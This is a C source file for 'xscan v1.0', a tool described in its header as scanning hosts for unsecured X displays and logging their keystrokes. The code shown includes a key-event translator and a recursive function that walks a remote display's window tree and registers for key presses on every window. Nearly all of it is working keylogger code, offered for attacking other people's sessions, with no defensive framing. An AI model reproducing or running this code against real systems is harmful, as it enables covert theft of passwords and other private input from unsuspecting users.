/**********************************************************************

        xscan v1.0 - Scans hosts for unsecured X displays and logs
                        keystrokes of those displays.

contact: pendleto@math.ukans.edu

All routines here adopted from xkey.c by Dominic Giampaolo (nick@cs.maxine.wpi.edu)

***********************************************************************/


#include <X11/Xlib.h>
#include <string.h>
#include <stdio.h>

static char KeyBuf[256];

char * TranslateKey(XEvent *Event)
{

int NumLooked;
char * Temp;
KeySym TheKeySym;

if (Event) 
{
NumLooked=XLookupString((XKeyEvent *)Event, KeyBuf, 256, &TheKeySym, NULL);

KeyBuf[NumLooked]='\0';

if (NumLooked==0)
	{
	Temp=XKeysymToString(TheKeySym);
	if (Temp)
		strcpy(KeyBuf, Temp);
	else
		strcpy(KeyBuf, "");
	}
	return KeyBuf;
	}
else
return NULL;

}


void get_window_keystrokes(Display * RemoteDisplay,Window DefRootWnd)
{

Window ParentWnd;
Window * ChildWnds;
unsigned int NumChildWnds;
int i;
int TreeStat;

TreeStat=XQueryTree(RemoteDisplay,DefRootWnd,&DefRootWnd,&ParentWnd,&ChildWnds,&NumChildWnds);

if (TreeStat==0)
	{
	fprintf(stderr, "Error querying the window tree\n");
	return;
	}

if (NumChildWnds==0) return;

/* Snoop This Window */
XSelectInput(RemoteDisplay,DefRootWnd, KeyPressMask);

for (i=0; i < NumChildWnds; i++)
	{
	XSelectInput(RemoteDisplay, ChildWnds[i], KeyPressMask);
	get_window_keystrokes(RemoteDisplay, ChildWnds[i]);
	}

XFree((char *)ChildWnds);

}

